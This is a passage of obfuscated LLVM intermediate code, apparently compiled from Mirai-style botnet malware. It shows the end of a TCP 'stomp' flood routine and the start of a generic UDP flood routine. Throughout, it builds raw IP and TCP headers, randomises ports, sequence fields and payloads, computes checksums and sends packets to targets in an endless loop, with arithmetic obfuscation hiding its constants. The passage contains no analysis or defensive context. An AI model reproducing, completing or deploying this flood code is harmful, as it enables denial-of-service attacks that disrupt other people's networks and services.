  %293 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %294 = load i32, i32* %9, align 4
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %293, i64 %295
  %297 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %296, i32 0, i32 2
  store i32 %292, i32* %297, align 4
  %298 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %299 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %298, i32 0, i32 1
  %300 = load i16, i16* %299, align 2
  %301 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %302 = load i32, i32* %9, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %301, i64 %303
  %305 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %304, i32 0, i32 3
  store i16 %300, i16* %305, align 4
  %306 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %307 = load i16, i16* %306, align 2
  %308 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %309 = load i32, i32* %9, align 4
  %310 = sext i32 %309 to i64
  %311 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %308, i64 %310
  %312 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %311, i32 0, i32 4
  store i16 %307, i16* %312, align 2
  %313 = load i32, i32* %24, align 4
  %314 = sext i32 %313 to i64
  %315 = sub i64 40, -8721847054457417247
  %316 = add i64 %315, %314
  %317 = add i64 %316, -8721847054457417247
  %318 = add i64 40, %314
  %319 = call noalias i8* @malloc(i64 %317) #6
  %320 = load i8**, i8*** %12, align 8
  %321 = load i32, i32* %9, align 4
  %322 = sext i32 %321 to i64
  %323 = getelementptr inbounds i8*, i8** %320, i64 %322
  store i8* %319, i8** %323, align 8
  %324 = load i8**, i8*** %12, align 8
  %325 = load i32, i32* %9, align 4
  %326 = sext i32 %325 to i64
  %327 = getelementptr inbounds i8*, i8** %324, i64 %326
  %328 = load i8*, i8** %327, align 8
  %329 = bitcast i8* %328 to %struct.iphdr*
  store %struct.iphdr* %329, %struct.iphdr** %36, align 8
  %330 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %331 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %330, i64 1
  %332 = bitcast %struct.iphdr* %331 to %struct.tcphdr*
  store %struct.tcphdr* %332, %struct.tcphdr** %37, align 8
  %333 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %334 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %333, i64 1
  %335 = bitcast %struct.tcphdr* %334 to i8*
  store i8* %335, i8** %38, align 8
  %336 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %337 = bitcast %struct.iphdr* %336 to i8*
  %338 = load i8, i8* %337, align 4
  %339 = xor i8 15, -1
  %340 = xor i8 %338, %339
  %341 = and i8 %340, %338
  %342 = and i8 %338, 15
  %343 = xor i8 %341, -1
  %344 = xor i8 64, -1
  %345 = xor i8 36, -1
  %346 = and i8 %343, 36
  %347 = and i8 %341, %345
  %348 = and i8 %344, 36
  %349 = and i8 64, %345
  %350 = or i8 %346, %347
  %351 = or i8 %348, %349
  %352 = xor i8 %350, %351
  %353 = or i8 %343, %344
  %354 = xor i8 %353, -1
  %355 = or i8 36, %345
  %356 = and i8 %354, %355
  %357 = or i8 %352, %356
  %358 = or i8 %341, 64
  store i8 %357, i8* %337, align 4
  %359 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %360 = bitcast %struct.iphdr* %359 to i8*
  %361 = load i8, i8* %360, align 4
  %362 = xor i8 -16, -1
  %363 = xor i8 %361, %362
  %364 = and i8 %363, %361
  %365 = and i8 %361, -16
  %366 = and i8 %364, 5
  %367 = xor i8 %364, 5
  %368 = or i8 %366, %367
  %369 = or i8 %364, 5
  store i8 %368, i8* %360, align 4
  %370 = load i8, i8* %13, align 1
  %371 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %372 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %371, i32 0, i32 1
  store i8 %370, i8* %372, align 1
  %373 = load i32, i32* %24, align 4
  %374 = sext i32 %373 to i64
  %375 = add i64 40, -7655274153780215752
  %376 = add i64 %375, %374
  %377 = sub i64 %376, -7655274153780215752
  %378 = add i64 40, %374
  %379 = trunc i64 %377 to i16
  %380 = call zeroext i16 @htons(i16 zeroext %379) #7
  %381 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %382 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %381, i32 0, i32 2
  store i16 %380, i16* %382, align 2
  %383 = load i16, i16* %14, align 2
  %384 = call zeroext i16 @htons(i16 zeroext %383) #7
  %385 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %386 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %385, i32 0, i32 3
  store i16 %384, i16* %386, align 4
  %387 = load i8, i8* %15, align 1
  %388 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %389 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %388, i32 0, i32 5
  store i8 %387, i8* %389, align 4
  %390 = load i8, i8* %16, align 1
  %391 = icmp ne i8 %390, 0
  br i1 %391, label %392, label %396

; <label>:392:                                    ; preds = %271
  %393 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %394 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %395 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %394, i32 0, i32 4
  store i16 %393, i16* %395, align 2
  br label %396

; <label>:396:                                    ; preds = %392, %271
  %397 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %398 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %397, i32 0, i32 6
  store i8 6, i8* %398, align 1
  %399 = load i32, i32* @LOCAL_ADDR, align 4
  %400 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %401 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %400, i32 0, i32 8
  store i32 %399, i32* %401, align 4
  %402 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %403 = load i32, i32* %9, align 4
  %404 = sext i32 %403 to i64
  %405 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %402, i64 %404
  %406 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %405, i32 0, i32 0
  %407 = load i32, i32* %406, align 4
  %408 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %409 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %408, i32 0, i32 9
  store i32 %407, i32* %409, align 4
  %410 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %411 = load i32, i32* %9, align 4
  %412 = sext i32 %411 to i64
  %413 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %410, i64 %412
  %414 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %413, i32 0, i32 3
  %415 = load i16, i16* %414, align 4
  %416 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %417 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %416, i32 0, i32 0
  store i16 %415, i16* %417, align 4
  %418 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %419 = load i32, i32* %9, align 4
  %420 = sext i32 %419 to i64
  %421 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %418, i64 %420
  %422 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %421, i32 0, i32 4
  %423 = load i16, i16* %422, align 2
  %424 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %425 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %424, i32 0, i32 1
  store i16 %423, i16* %425, align 2
  %426 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %427 = load i32, i32* %9, align 4
  %428 = sext i32 %427 to i64
  %429 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %426, i64 %428
  %430 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %429, i32 0, i32 2
  %431 = load i32, i32* %430, align 4
  %432 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %433 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %432, i32 0, i32 2
  store i32 %431, i32* %433, align 4
  %434 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %435 = load i32, i32* %9, align 4
  %436 = sext i32 %435 to i64
  %437 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %434, i64 %436
  %438 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %437, i32 0, i32 1
  %439 = load i32, i32* %438, align 4
  %440 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %441 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %440, i32 0, i32 3
  store i32 %439, i32* %441, align 4
  %442 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %443 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %442, i32 0, i32 4
  %444 = load i16, i16* %443, align 4
  %445 = xor i16 %444, -1
  %446 = xor i16 -241, -1
  %447 = xor i16 -31770, -1
  %448 = or i16 %445, %446
  %449 = or i16 -31770, %447
  %450 = xor i16 %448, -1
  %451 = and i16 %450, %449
  %452 = and i16 %444, -241
  %453 = and i16 %451, 128
  %454 = xor i16 %451, 128
  %455 = or i16 %453, %454
  %456 = or i16 %451, 128
  store i16 %455, i16* %443, align 4
  %457 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %458 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %457, i32 0, i32 4
  %459 = load i16, i16* %458, align 4
  %460 = xor i16 %459, -1
  %461 = xor i16 -257, -1
  %462 = xor i16 9703, -1
  %463 = or i16 %460, %461
  %464 = or i16 9703, %462
  %465 = xor i16 %463, -1
  %466 = and i16 %465, %464
  %467 = and i16 %459, -257
  %468 = and i16 %466, 256
  %469 = xor i16 %466, 256
  %470 = or i16 %468, %469
  %471 = or i16 %466, 256
  store i16 %470, i16* %458, align 4
  %472 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %473 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %472, i32 0, i32 4
  %474 = load i16, i16* %473, align 4
  %475 = xor i16 -4097, -1
  %476 = xor i16 %474, %475
  %477 = and i16 %476, %474
  %478 = and i16 %474, -4097
  %479 = and i16 %477, 4096
  %480 = xor i16 %477, 4096
  %481 = or i16 %479, %480
  %482 = or i16 %477, 4096
  store i16 %481, i16* %473, align 4
  %483 = call i32 @rand_next()
  %484 = xor i32 65535, -1
  %485 = xor i32 %483, %484
  %486 = and i32 %485, %483
  %487 = and i32 %483, 65535
  %488 = trunc i32 %486 to i16
  %489 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %490 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %489, i32 0, i32 5
  store i16 %488, i16* %490, align 2
  %491 = load i8, i8* %18, align 1
  %492 = sext i8 %491 to i16
  %493 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %494 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %493, i32 0, i32 4
  %495 = load i16, i16* %494, align 4
  %496 = xor i16 1, -1
  %497 = xor i16 %492, %496
  %498 = and i16 %497, %492
  %499 = and i16 %492, 1
  %500 = shl i16 %498, 13
  %501 = xor i16 -8193, -1
  %502 = xor i16 %495, %501
  %503 = and i16 %502, %495
  %504 = and i16 %495, -8193
  %505 = xor i16 %503, -1
  %506 = xor i16 %500, -1
  %507 = xor i16 6902, -1
  %508 = and i16 %505, 6902
  %509 = and i16 %503, %507
  %510 = and i16 %506, 6902
  %511 = and i16 %500, %507
  %512 = or i16 %508, %509
  %513 = or i16 %510, %511
  %514 = xor i16 %512, %513
  %515 = or i16 %505, %506
  %516 = xor i16 %515, -1
  %517 = or i16 6902, %507
  %518 = and i16 %516, %517
  %519 = or i16 %514, %518
  %520 = or i16 %503, %500
  store i16 %519, i16* %494, align 4
  %521 = load i8, i8* %19, align 1
  %522 = sext i8 %521 to i16
  %523 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %524 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %523, i32 0, i32 4
  %525 = load i16, i16* %524, align 4
  %526 = xor i16 %522, -1
  %527 = xor i16 1, -1
  %528 = xor i16 -28260, -1
  %529 = or i16 %526, %527
  %530 = or i16 -28260, %528
  %531 = xor i16 %529, -1
  %532 = and i16 %531, %530
  %533 = and i16 %522, 1
  %534 = shl i16 %532, 12
  %535 = xor i16 -4097, -1
  %536 = xor i16 %525, %535
  %537 = and i16 %536, %525
  %538 = and i16 %525, -4097
  %539 = xor i16 %537, -1
  %540 = xor i16 %534, -1
  %541 = xor i16 -32449, -1
  %542 = and i16 %539, -32449
  %543 = and i16 %537, %541
  %544 = and i16 %540, -32449
  %545 = and i16 %534, %541
  %546 = or i16 %542, %543
  %547 = or i16 %544, %545
  %548 = xor i16 %546, %547
  %549 = or i16 %539, %540
  %550 = xor i16 %549, -1
  %551 = or i16 -32449, %541
  %552 = and i16 %550, %551
  %553 = or i16 %548, %552
  %554 = or i16 %537, %534
  store i16 %553, i16* %524, align 4
  %555 = load i8, i8* %20, align 1
  %556 = sext i8 %555 to i16
  %557 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %558 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %557, i32 0, i32 4
  %559 = load i16, i16* %558, align 4
  %560 = xor i16 %556, -1
  %561 = xor i16 1, -1
  %562 = xor i16 26293, -1
  %563 = or i16 %560, %561
  %564 = or i16 26293, %562
  %565 = xor i16 %563, -1
  %566 = and i16 %565, %564
  %567 = and i16 %556, 1
  %568 = shl i16 %566, 11
  %569 = xor i16 -2049, -1
  %570 = xor i16 %559, %569
  %571 = and i16 %570, %559
  %572 = and i16 %559, -2049
  %573 = and i16 %571, %568
  %574 = xor i16 %571, %568
  %575 = or i16 %573, %574
  %576 = or i16 %571, %568
  store i16 %575, i16* %558, align 4
  %577 = load i8, i8* %21, align 1
  %578 = sext i8 %577 to i16
  %579 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %580 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %579, i32 0, i32 4
  %581 = load i16, i16* %580, align 4
  %582 = xor i16 %578, -1
  %583 = xor i16 1, -1
  %584 = xor i16 -19623, -1
  %585 = or i16 %582, %583
  %586 = or i16 -19623, %584
  %587 = xor i16 %585, -1
  %588 = and i16 %587, %586
  %589 = and i16 %578, 1
  %590 = shl i16 %588, 10
  %591 = xor i16 -1025, -1
  %592 = xor i16 %581, %591
  %593 = and i16 %592, %581
  %594 = and i16 %581, -1025
  %595 = xor i16 %593, -1
  %596 = xor i16 %590, -1
  %597 = xor i16 -16727, -1
  %598 = and i16 %595, -16727
  %599 = and i16 %593, %597
  %600 = and i16 %596, -16727
  %601 = and i16 %590, %597
  %602 = or i16 %598, %599
  %603 = or i16 %600, %601
  %604 = xor i16 %602, %603
  %605 = or i16 %595, %596
  %606 = xor i16 %605, -1
  %607 = or i16 -16727, %597
  %608 = and i16 %606, %607
  %609 = or i16 %604, %608
  %610 = or i16 %593, %590
  store i16 %609, i16* %580, align 4
  %611 = load i8, i8* %22, align 1
  %612 = sext i8 %611 to i16
  %613 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %614 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %613, i32 0, i32 4
  %615 = load i16, i16* %614, align 4
  %616 = xor i16 1, -1
  %617 = xor i16 %612, %616
  %618 = and i16 %617, %612
  %619 = and i16 %612, 1
  %620 = shl i16 %618, 9
  %621 = xor i16 -513, -1
  %622 = xor i16 %615, %621
  %623 = and i16 %622, %615
  %624 = and i16 %615, -513
  %625 = xor i16 %623, -1
  %626 = xor i16 %620, -1
  %627 = xor i16 29088, -1
  %628 = and i16 %625, 29088
  %629 = and i16 %623, %627
  %630 = and i16 %626, 29088
  %631 = and i16 %620, %627
  %632 = or i16 %628, %629
  %633 = or i16 %630, %631
  %634 = xor i16 %632, %633
  %635 = or i16 %625, %626
  %636 = xor i16 %635, -1
  %637 = or i16 29088, %627
  %638 = and i16 %636, %637
  %639 = or i16 %634, %638
  %640 = or i16 %623, %620
  store i16 %639, i16* %614, align 4
  %641 = load i8, i8* %23, align 1
  %642 = sext i8 %641 to i16
  %643 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %644 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %643, i32 0, i32 4
  %645 = load i16, i16* %644, align 4
  %646 = xor i16 %642, -1
  %647 = xor i16 1, -1
  %648 = xor i16 -4321, -1
  %649 = or i16 %646, %647
  %650 = or i16 -4321, %648
  %651 = xor i16 %649, -1
  %652 = and i16 %651, %650
  %653 = and i16 %642, 1
  %654 = shl i16 %652, 8
  %655 = xor i16 -257, -1
  %656 = xor i16 %645, %655
  %657 = and i16 %656, %645
  %658 = and i16 %645, -257
  %659 = xor i16 %657, -1
  %660 = xor i16 %654, -1
  %661 = xor i16 -16233, -1
  %662 = and i16 %659, -16233
  %663 = and i16 %657, %661
  %664 = and i16 %660, -16233
  %665 = and i16 %654, %661
  %666 = or i16 %662, %663
  %667 = or i16 %664, %665
  %668 = xor i16 %666, %667
  %669 = or i16 %659, %660
  %670 = xor i16 %669, -1
  %671 = or i16 -16233, %661
  %672 = and i16 %670, %671
  %673 = or i16 %668, %672
  %674 = or i16 %657, %654
  store i16 %673, i16* %644, align 4
  %675 = load i8*, i8** %38, align 8
  %676 = load i32, i32* %24, align 4
  call void @rand_str(i8* %675, i32 %676)
  br label %724

; <label>:677:                                    ; preds = %256, %241
  %678 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %679 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %678, i32 0, i32 4
  %680 = load i16, i16* %679, align 4
  %681 = lshr i16 %680, 8
  %682 = xor i16 %681, -1
  %683 = xor i16 1, -1
  %684 = xor i16 26524, -1
  %685 = or i16 %682, %683
  %686 = or i16 26524, %684
  %687 = xor i16 %685, -1
  %688 = and i16 %687, %686
  %689 = and i16 %681, 1
  %690 = zext i16 %688 to i32
  %691 = icmp ne i32 %690, 0
  br i1 %691, label %707, label %692

; <label>:692:                                    ; preds = %677
  %693 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %694 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %693, i32 0, i32 4
  %695 = load i16, i16* %694, align 4
  %696 = lshr i16 %695, 10
  %697 = xor i16 %696, -1
  %698 = xor i16 1, -1
  %699 = xor i16 -12765, -1
  %700 = or i16 %697, %698
  %701 = or i16 -12765, %699
  %702 = xor i16 %700, -1
  %703 = and i16 %702, %701
  %704 = and i16 %696, 1
  %705 = zext i16 %703 to i32
  %706 = icmp ne i32 %705, 0
  br i1 %706, label %707, label %710

; <label>:707:                                    ; preds = %692, %677
  %708 = load i32, i32* %26, align 4
  %709 = call i32 @close(i32 %708)
  br label %121

; <label>:710:                                    ; preds = %692
  br label %711

; <label>:711:                                    ; preds = %710
  br label %712

; <label>:712:                                    ; preds = %711, %229
  br label %713

; <label>:713:                                    ; preds = %712, %225, %217
  %714 = call i64 @time(i64* null) #6
  %715 = load i64, i64* %31, align 8
  %716 = sub i64 0, %715
  %717 = add i64 %714, %716
  %718 = sub nsw i64 %714, %715
  %719 = icmp sgt i64 %717, 10
  br i1 %719, label %720, label %723

; <label>:720:                                    ; preds = %713
  %721 = load i32, i32* %26, align 4
  %722 = call i32 @close(i32 %721)
  br label %121

; <label>:723:                                    ; preds = %713
  br label %205

; <label>:724:                                    ; preds = %396
  br label %725

; <label>:725:                                    ; preds = %724, %124
  %726 = load i32, i32* %9, align 4
  %727 = sub i32 0, 1
  %728 = sub i32 %726, %727
  %729 = add nsw i32 %726, 1
  store i32 %728, i32* %9, align 4
  br label %115

; <label>:730:                                    ; preds = %115
  br label %731

; <label>:731:                                    ; preds = %862, %730
  store i32 0, i32* %9, align 4
  br label %732

; <label>:732:                                    ; preds = %856, %731
  %733 = load i32, i32* %9, align 4
  %734 = load i8, i8* %5, align 1
  %735 = zext i8 %734 to i32
  %736 = icmp slt i32 %733, %735
  br i1 %736, label %737, label %862

; <label>:737:                                    ; preds = %732
  %738 = load i8**, i8*** %12, align 8
  %739 = load i32, i32* %9, align 4
  %740 = sext i32 %739 to i64
  %741 = getelementptr inbounds i8*, i8** %738, i64 %740
  %742 = load i8*, i8** %741, align 8
  store i8* %742, i8** %39, align 8
  %743 = load i8*, i8** %39, align 8
  %744 = bitcast i8* %743 to %struct.iphdr*
  store %struct.iphdr* %744, %struct.iphdr** %40, align 8
  %745 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %746 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %745, i64 1
  %747 = bitcast %struct.iphdr* %746 to %struct.tcphdr*
  store %struct.tcphdr* %747, %struct.tcphdr** %41, align 8
  %748 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %749 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %748, i64 1
  %750 = bitcast %struct.tcphdr* %749 to i8*
  store i8* %750, i8** %42, align 8
  %751 = load i16, i16* %14, align 2
  %752 = zext i16 %751 to i32
  %753 = icmp eq i32 %752, 65535
  br i1 %753, label %754, label %763

; <label>:754:                                    ; preds = %737
  %755 = call i32 @rand_next()
  %756 = xor i32 65535, -1
  %757 = xor i32 %755, %756
  %758 = and i32 %757, %755
  %759 = and i32 %755, 65535
  %760 = trunc i32 %758 to i16
  %761 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %762 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %761, i32 0, i32 3
  store i16 %760, i16* %762, align 4
  br label %763

; <label>:763:                                    ; preds = %754, %737
  %764 = load i8, i8* %25, align 1
  %765 = icmp ne i8 %764, 0
  br i1 %765, label %766, label %769

; <label>:766:                                    ; preds = %763
  %767 = load i8*, i8** %42, align 8
  %768 = load i32, i32* %24, align 4
  call void @rand_str(i8* %767, i32 %768)
  br label %769

; <label>:769:                                    ; preds = %766, %763
  %770 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %771 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %770, i32 0, i32 7
  store i16 0, i16* %771, align 2
  %772 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %773 = bitcast %struct.iphdr* %772 to i16*
  %774 = call zeroext i16 @checksum_generic(i16* %773, i32 20)
  %775 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %776 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %775, i32 0, i32 7
  store i16 %774, i16* %776, align 2
  %777 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %778 = load i32, i32* %9, align 4
  %779 = sext i32 %778 to i64
  %780 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %777, i64 %779
  %781 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %780, i32 0, i32 1
  %782 = load i32, i32* %781, align 4
  %783 = add i32 %782, -1426087368
  %784 = add i32 %783, 1
  %785 = sub i32 %784, -1426087368
  %786 = add i32 %782, 1
  store i32 %785, i32* %781, align 4
  %787 = trunc i32 %782 to i16
  %788 = call zeroext i16 @htons(i16 zeroext %787) #7
  %789 = zext i16 %788 to i32
  %790 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %791 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %790, i32 0, i32 2
  store i32 %789, i32* %791, align 4
  %792 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %793 = load i32, i32* %9, align 4
  %794 = sext i32 %793 to i64
  %795 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %792, i64 %794
  %796 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %795, i32 0, i32 2
  %797 = load i32, i32* %796, align 4
  %798 = trunc i32 %797 to i16
  %799 = call zeroext i16 @htons(i16 zeroext %798) #7
  %800 = zext i16 %799 to i32
  %801 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %802 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %801, i32 0, i32 3
  store i32 %800, i32* %802, align 4
  %803 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %804 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %803, i32 0, i32 6
  store i16 0, i16* %804, align 4
  %805 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %806 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %807 = bitcast %struct.tcphdr* %806 to i8*
  %808 = load i32, i32* %24, align 4
  %809 = sext i32 %808 to i64
  %810 = sub i64 0, 20
  %811 = sub i64 0, %809
  %812 = add i64 %810, %811
  %813 = sub i64 0, %812
  %814 = add i64 20, %809
  %815 = trunc i64 %813 to i16
  %816 = call zeroext i16 @htons(i16 zeroext %815) #7
  %817 = load i32, i32* %24, align 4
  %818 = sext i32 %817 to i64
  %819 = sub i64 0, 20
  %820 = sub i64 0, %818
  %821 = add i64 %819, %820
  %822 = sub i64 0, %821
  %823 = add i64 20, %818
  %824 = trunc i64 %822 to i32
  %825 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %805, i8* %807, i16 zeroext %816, i32 %824)
  %826 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %827 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %826, i32 0, i32 6
  store i16 %825, i16* %827, align 4
  %828 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %829 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %828, i32 0, i32 1
  %830 = load i16, i16* %829, align 2
  %831 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %832 = load i32, i32* %9, align 4
  %833 = sext i32 %832 to i64
  %834 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %831, i64 %833
  %835 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %834, i32 0, i32 0
  %836 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %835, i32 0, i32 1
  store i16 %830, i16* %836, align 2
  %837 = load i32, i32* %10, align 4
  %838 = load i8*, i8** %39, align 8
  %839 = load i32, i32* %24, align 4
  %840 = sext i32 %839 to i64
  %841 = sub i64 0, 40
  %842 = sub i64 0, %840
  %843 = add i64 %841, %842
  %844 = sub i64 0, %843
  %845 = add i64 40, %840
  %846 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %847 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %848 = load i32, i32* %9, align 4
  %849 = sext i32 %848 to i64
  %850 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %847, i64 %849
  %851 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %850, i32 0, i32 0
  %852 = bitcast %struct.sockaddr_in* %851 to %struct.sockaddr*
  store %struct.sockaddr* %852, %struct.sockaddr** %846, align 8
  %853 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %854 = load %struct.sockaddr*, %struct.sockaddr** %853, align 8
  %855 = call i64 @sendto(i32 %837, i8* %838, i64 %844, i32 16384, %struct.sockaddr* %854, i32 16)
  br label %856

; <label>:856:                                    ; preds = %769
  %857 = load i32, i32* %9, align 4
  %858 = add i32 %857, -235508190
  %859 = add i32 %858, 1
  %860 = sub i32 %859, -235508190
  %861 = add nsw i32 %857, 1
  store i32 %860, i32* %9, align 4
  br label %732

; <label>:862:                                    ; preds = %732
  br label %731

; <label>:863:                                    ; preds = %216, %111, %105
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpgeneric(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i16, align 2
  %19 = alloca i8, align 1
  %20 = alloca i32, align 4
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.udphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %28 = load i8, i8* %5, align 1
  %29 = zext i8 %28 to i64
  %30 = call noalias i8* @calloc(i64 %29, i64 8) #6
  %31 = bitcast i8* %30 to i8**
  store i8** %31, i8*** %11, align 8
  %32 = load i8, i8* %7, align 1
  %33 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %34 = call i32 @attack_get_opt_int(i8 zeroext %32, %struct.attack_option* %33, i8 zeroext 2, i32 0)
  %35 = trunc i32 %34 to i8
  store i8 %35, i8* %12, align 1
  %36 = load i8, i8* %7, align 1
  %37 = load %struct.attack_option*, %struct.attack_option** %8, align 8
